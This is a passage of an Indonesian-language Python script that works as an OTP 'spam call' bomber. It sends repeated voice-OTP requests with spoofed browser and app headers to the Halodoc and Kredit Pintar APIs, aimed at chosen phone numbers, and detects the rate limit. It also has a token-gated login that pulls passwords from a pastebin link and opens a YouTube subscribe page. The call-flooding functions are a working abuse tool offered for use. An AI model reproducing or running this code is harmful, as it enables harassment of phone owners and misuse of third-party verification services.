			for free_tutorial in sanz:
				nomor = free_tutorial.strip()
				nom = nomor[3:]
				__sanz_server__().call_otp_2(nomor,nom)
				animasi().wait(0,25)

			animasi().wait(0,35)
			animasi().timer()
			animasi().teks(f"{p}[{k}*{p}] Done Ngab..");sleep(1)
			animasi().teks(f"{p}[{m}!{p}] Jangan Lupa Subrek Yt {h}FREE TUTORIAL");sleep(1)
			animasi().timer();hapus();exit()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

class __sanz_server__:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")

		self.url_get_data_magento = "https://magneto.api.halodoc.com/api/v1/users/status"
		self.url_post_data_magento = "https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests"
		self.url_post_data_kredito = f"https://app.kreditpintar.com/api/auth/send-code?lang={sanz_code}"
		pass

	def call_otp_1(self,nomor):
		try:
			sanz_get_data = get(self.url_get_data_magento,headers={"user-agent":agent})
			sanz_kukis = sanz_get_data.cookies["XSRF-TOKEN"]
			host = {"Host": "magneto.api.halodoc.com","content-length": "52","accept": "application/json, text/plain, */*","x-xsrf-token": sanz_kukis,"user-agent": agent,"content-type": "application/json","origin": "https://www.halodoc.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cookie": f"XSRF-TOKEN={sanz_kukis}"}
			data = {"phone_number": nomor,"channel": "voice"}
			sanz = post(self.url_post_data_magento,headers=host,json=data).text
			if '"new_user":false' in sanz:
				animasi().teks(f"{p}[{h}✓{p}] Spam call {k}({h}{nomor}{k}) {p}berhasil");sleep(1)
				animasi().wait(1,10)
			elif '"message":"You can only request 5 OTPs in 30 MINUTES"' in sanz:
				animasi().teks(f"{p}[{m}x{p}] Spam call {k}({h}{nomor}{k}) {p}limit");sleep(1)
				animasi().teks(f"{p}[{m}!{p}] Silahkan tunggu 30 mnt utk spam lagi{m}..")
				animasi().jeda();hapus();exit()
			else:
				animasi().teks(f"{p}[{m}x{p}] Spam call {k}({h}{nomor}{k}) {p}gagal");sleep(1)
				animasi().wait(1,10)

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def call_otp_2(self,nomor,nom):
		try:
			sanz_get_data = get(self.url_get_data_magento,headers={"user-agent":agent})
			sanz_kukis = sanz_get_data.cookies["XSRF-TOKEN"]
			host = {"Host": "magneto.api.halodoc.com","content-length": "52","accept": "application/json, text/plain, */*","x-xsrf-token": sanz_kukis,"user-agent": agent,"content-type": "application/json","origin": "https://www.halodoc.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cookie": f"XSRF-TOKEN={sanz_kukis}"}
			__host__ = {"Host": "app.kreditpintar.com","x-adv-token": "","x-adv-uuid": "a32cc876-dbb1-437f-b668-f9aae3591488","x-adv-advertisingid": "954679fc-fa7f-44a1-95e3-34eef5f58415","x-adv-channel": "google_store","x-adv-market-channel": "googleadwords_int","x-app-version": "1.10.0(303)","user-agent": f"{agent} uuid/a32cc876-dbb1-437f-b668-f9aae3591488 adid/954679fc-fa7f-44a1-95e3-34eef5f58415 PINTAR_ANDROID/1.10.0_303","x-adv-appinstanceid": "ce79da7e86d4fc8d1ae3b9648f66440e","x-os-type": "ANDROID","x-adv-bm": "56c02d39b8425422","content-type": "application/json; charset=UTF-8","content-length": "64","accept-encoding": "gzip"}
			data = {"phone_number": nomor,"channel": "voice"}
			__data__ = {"mobileNumber": f"0{nom}","otpType": "REGISTER","type": "VOICE"}
			sanz = post(self.url_post_data_magento,headers=host,json=data).text
			animasi().teks(f"{p}[{h}✓{p}] Spam call {k}({h}{nomor}{k}) {p}berhasil");sleep(1)
			animasi().wait(0,25)
			__sanz__ = post(self.url_post_data_kredito,headers=__host__,json=__data__).text

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

# -- free login -- #
class __sanz_login__:
	def __init__(self):
		self.__aink_sanz__ = "FREE TUTORIAL"
		self.login()

	def animasi(self,delay):
		try:
			sxp = ['█■■■■', '■█■■■', '■■█■■', '■■■█■', '■■■■█']
			for _ in range(int(delay)):
				for i in range(len(sxp)):
					sleep(0.25)
					sys.stdout.write(f"\r{p}[{h}•{p}] Memverifikasi token, tunggu {k}[{h}" + sxp[i % len(sxp)]+f"{k}] ")
					sys.stdout.flush()

			sys.stdout.write("\r\033[K");sleep(1)

		except KeyboardInterrupt:
			sys.stdout.write("\r\033[K")
			hapus();sleep(0.5)
			exit(f"{p}[{m}!{p}] {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			sys.stdout.write("\r\033[K")
			hapus();sleep(0.5)
			exit(f"{p}[{m}!{p}] {p}Koneksi Internet Error\n")
		except Exception as lol:
			sys.stdout.write("\r\033[K")
			to=f"{p}[{m}!{p}] {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def sxp_waktu(self):
		import time
		_time_ = int(time.strftime("%H"))
		if _time_ < 12:
			return "Pagi"
		elif _time_ < 15:
			return "Siang"
		elif _time_ < 18:
			return "Sore"
		else:
			return "Malam"

	def log_pewe(self):
		from datetime import datetime as w
		import time, random
		# -- variabel tgl dll -- #
		_waktu = time.strftime("%H:%M:%S %Z")
		waktu = time.localtime()
		tanggal = time.strftime("%d",waktu)
		_bulan = time.strftime("%B",waktu)
		tahun = time.strftime("%Y",waktu)
		_hari = time.strftime("%A",waktu)
		bulan_ = {"January": "Januari", "February": "Februari", "March": "Maret", "April": "April", "May": "Mei", "June": "Juni", "July": "Juli", "August": "Agustus", "September": "September", "October": "Oktober", "November": "November", "December": "Desember"}
		hari_ = {"Sunday": "Minggu", "Monday": "Senin", "Tuesday": "Selasa", "Wednesday": "Rabu", "Thursday": "Kamis", "Friday": "Jumat", "Saturday": "Sabtu"}
		bulan = bulan_.get(_bulan)
		hari = hari_.get(_hari)
		rd = random.choice([10,15,20])
		hg = "\033[4;32m"
		mm = "\033[41m"
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			url = "https://pastebin.com/raw/4HG2ni4x" # url link + pass random mode
			req = get(url,headers={"user-agent":agent}).text
			index_link = req.split("Link: ")[1].split("|")
			index_pass = req.split("\r\nPass: ")[1].split("|")
			_link1 = index_link[0];_link2 = index_link[1];_link3 = index_link[2].split("\r\nPass: ")[0]
			_pass1 = index_pass[0];_pass2 = index_pass[1];_pass3 = index_pass[2].split("\r\nLink2: ")[0]
			_acak1 = _link1 + "|" + _pass1;_acak2 = _link2 + "|" + _pass2;_acak3 = _link3 + "|" + _pass3
			index = random.choice([_acak1.split("|"),_acak2.split("|"),_acak3.split("|")])
			_link = get("https://tinyurl.com/api-create.php?url="+index[0],headers={"user-agent":agent}).text
			_pass = get(index[1],headers={"user-agent":agent}).text
			# -- Sanz Ganz -- #
			banner = f"""[bold red]● [bold yellow]● [bold green]●[/]
[bold red]     __             _        ___
    / /  ___  ___ _(_)__    / _ \___ ____ ____
   / /__/ _ \/ _ `/ / _ \  / ___/ _ `/ _ `/ -_)
[bold white]  /____/\___/\_, /_/_//_/ /_/   \_,_/\_, /\__/
            /___/                   /___/[/]

   [bold white on red] Created by Sanz - Youtube : FREE TUTORIAL [/]"""

			printer(Panel(banner,title=f"[bold red]• [bold white]Selamat {self.sxp_waktu()} [bold red]•[/]",width=53,style="color(8)"));print()
			print(f"{p}[{m}¤{p}] Tanggal {m}: {p}{hari}, {tanggal} {bulan} {tahun}")
			print(f"{p}[{m}¤{p}] Waktu   {m}: {p}{_waktu}")
			print(f"{hx2}-------------")
			print(f"{p}[{h}•{p}] Link token {m}: {hg}{_link}{px}");print()
			print(f"{p}[{m}!{p}] Silahkan ambil dulu {m}↑{p} token nya lalu")
			print(f"    pastekan dibagian input dibawah {m}↓");print()
			sanz_pw = input(f"{p}[{m}?{p}] Input Token {m}: {hx2}")
			sleep(2);print();sleep(1)
			if sanz_pw == _pass:
				self.animasi(int(rd))
				sleep(0.5)
				save = open(f"{path}/{file}","w").write('{\n  "data": {\n  "token": "'+sanz_pw+'",\n  "creator": "Sanz",\n  "youtube": "FREE TUTORIAL"\n }\n}')
				print(f"\a{p}[{h}✓{p}] Token Benar")
				sleep(2)
				clear()
			elif sanz_pw == "":
				sleep(0.5)
				print(f"\a{p}[{m}!{p}] Jangan Kosong Ngab")
				sleep(2)
				self.log_pewe()
			else:
				self.animasi(int(rd))
				sleep(0.5)
				print(f"\a{p}[{m}x{p}] Token Salah")
				sleep(2)
				self.log_pewe()

	def login(self):
		try:
			self.log_pewe()
			clear()
			print(f"{bx}Subrek dulu channel {p}YT Aing cuk{bx}!!");sleep(1)
			os.system(f"xdg-open {subrek_yt_free_tutorial}");sleep(10)
			Sanz()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Server Error\n{p}[{m}>{p}] Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Server Error\n{p}[{m}!{p}] Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"\n{p}[{m}!{p}] Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

# -- premium login -- #
class __sanz_login_prem__:
	def __init__(self):
		self.__aink_sanz__ = "FREE TUTORIAL"
		self.login()

	def animasi(self,delay):
		try:
			sxp = ['█■■■■', '■█■■■', '■■█■■', '■■■█■', '■■■■█']
			for _ in range(int(delay)):
				for i in range(len(sxp)):
					sleep(0.25)
					sys.stdout.write(f"\r{p}[{h}•{p}] Memverifikasi token, tunggu {k}[{h}" + sxp[i % len(sxp)]+f"{k}] ")
					sys.stdout.flush()

			sys.stdout.write("\r\033[K");sleep(1)

		except KeyboardInterrupt:
			sys.stdout.write("\r\033[K")
			hapus();sleep(0.5)
			exit(f"{p}[{m}!{p}] {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			sys.stdout.write("\r\033[K")
			hapus();sleep(0.5)
			exit(f"{p}[{m}!{p}] {p}Koneksi Internet Error\n")
		except Exception as lol:
			sys.stdout.write("\r\033[K")
			to=f"{p}[{m}!{p}] {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def sxp_waktu(self):
		import time
		_time_ = int(time.strftime("%H"))
		if _time_ < 12:
			return "Pagi"
		elif _time_ < 15:
			return "Siang"
		elif _time_ < 18:
			return "Sore"
		else:
			return "Malam"

	def log_pewe(self):
		from datetime import datetime as w
		import time, random
		# -- variabel tgl dll -- #
		_waktu = time.strftime("%H:%M:%S %Z")
		waktu = time.localtime()
		tanggal = time.strftime("%d",waktu)
		_bulan = time.strftime("%B",waktu)
		tahun = time.strftime("%Y",waktu)
		_hari = time.strftime("%A",waktu)
		bulan_ = {"January": "Januari", "February": "Februari", "March": "Maret", "April": "April", "May": "Mei", "June": "Juni", "July": "Juli", "August": "Agustus", "September": "September", "October": "Oktober", "November": "November", "December": "Desember"}
		hari_ = {"Sunday": "Minggu", "Monday": "Senin", "Tuesday": "Selasa", "Wednesday": "Rabu", "Thursday": "Kamis", "Friday": "Jumat", "Saturday": "Sabtu"}
		bulan = bulan_.get(_bulan)
		hari = hari_.get(_hari)
		rd = random.choice([10,15,20])
		hg = "\033[4;32m"
		mm = "\033[41m"
		try:
			user = open(f"{path}/{prem}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			url = "https://pastebin.com/raw/4HG2ni4x" # url link + pass random mode
			req = get(url,headers={"user-agent":agent}).text
			index_link = req.split("Link2: ")[1].split("|")
			index_pass = req.split("\r\nPass2: ")[1].split("|")
			_link1 = index_link[0];_link2 = index_link[1];_link3 = index_link[2];_link4 = index_link[3];_link5 = index_link[4].split("\r\nPass2: ")[0]
			_pass1 = index_pass[0];_pass2 = index_pass[1];_pass3 = index_pass[2];_pass4 = index_pass[3];_pass5 = index_pass[4]
			_acak1 = _link1 + "|" + _pass1;_acak2 = _link2 + "|" + _pass2;_acak3 = _link3 + "|" + _pass3;_acak4 = _link4 + "|" + _pass4;_acak5 = _link5 + "|" + _pass5
			index = random.choice([_acak1.split("|"),_acak2.split("|"),_acak3.split("|"),_acak4.split("|"),_acak5.split("|")])
			_link = get("https://tinyurl.com/api-create.php?url="+index[0],headers={"user-agent":agent}).text
			_pass = get(index[1],headers={"user-agent":agent}).text
			# -- Sanz Ganz -- #
			banner = f"""[bold red]● [bold yellow]● [bold green]●[/]
[bold red]     __             _        ___
    / /  ___  ___ _(_)__    / _ \___ ____ ____
   / /__/ _ \/ _ `/ / _ \  / ___/ _ `/ _ `/ -_)
[bold white]  /____/\___/\_, /_/_//_/ /_/   \_,_/\_, /\__/
            /___/                   /___/[/]

   [bold white on red] Created by Sanz - Youtube : FREE TUTORIAL [/]"""

			printer(Panel(banner,title=f"[bold red]• [bold white]Selamat {self.sxp_waktu()} [bold black]| [bold white]Premium Login [bold red]•[/]",width=53,style="color(8)"));print()
			print(f"{p}[{m}¤{p}] Tanggal {m}: {p}{hari}, {tanggal} {bulan} {tahun}")
			print(f"{p}[{m}¤{p}] Waktu   {m}: {p}{_waktu}")
			print(f"{hx2}-------------")
			print(f"{p}[{h}•{p}] Link token {m}: {hg}{_link}{px}");print()
			print(f"{p}[{m}!{p}] Silahkan ambil dulu {m}↑{p} token nya lalu")
			print(f"    pastekan dibagian input dibawah {m}↓");print()
			sanz_pw = input(f"{p}[{m}?{p}] Input Token {m}: {hx2}")
			sleep(2);print();sleep(1)
			if sanz_pw == _pass:
				self.animasi(int(rd))
				sleep(0.5)
				save = open(f"{path}/{prem}","w").write('{\n  "data": {\n  "token": "'+sanz_pw+'",\n  "creator": "Sanz",\n  "youtube": "FREE TUTORIAL",\n  "status": "Premium"\n }\n}')
				print(f'\a{p}[{h}✓{p}] Token Benar, {px}{kon}{kx}"{h}status{kx}"{px}: {kx}"{h}premium{kx}"{px}{tol}')
				sleep(2)
				clear()
			elif sanz_pw == "":
				sleep(0.5)
				print(f'\a{p}[{m}!{p}] Jangan Kosong Ngab, {px}{kon}{kx}"{h}status{kx}"{px}: {kx}"{m}failed{kx}"{px}{tol}')
				sleep(2)
				self.log_pewe()
			else:
				self.animasi(int(rd))
				sleep(0.5)
				print(f'\a{p}[{m}x{p}] Token Salah, {px}{kon}{kx}"{h}status{kx}"{px}: {kx}"{m}failed{kx}"{px}{tol}')
				sleep(2)
				self.log_pewe()

	def login(self):
		try:
			self.log_pewe()
			clear();sleep(0.5)
			animasi().jeda()
			animasi().teks(f"{p}[{m}!{p}] Silahkan jalankan lagi sc-nya ngab..\n    ketik perintah {k}'{h}python Run.py{k}'{px}")
			animasi().jeda();hapus()
			exit()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Server Error\n{p}[{m}>{p}] Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Server Error\n{p}[{m}!{p}] Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"\n{p}[{m}!{p}] Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

if __name__ == "__main__":
	try:
		__sanz_login__()

	except KeyboardInterrupt:
		hapus();sleep(0.5)
		exit(f"{km} {p}Program Dihentikan\n")
	except requests.exceptions.ConnectionError:
		hapus();sleep(0.5)
		exit(f"{km} {p}Koneksi Internet Error\n")
	except KeyError:
		hapus();sleep(0.5)
		exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
	except json.decoder.JSONDecodeError:
		hapus();sleep(0.5)
		exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
	except Exception as lol:
		to=f"{km} {p}Error {m}: {p}"
		hapus();sleep(0.5)
		exit(f"{to}{lol}\n")

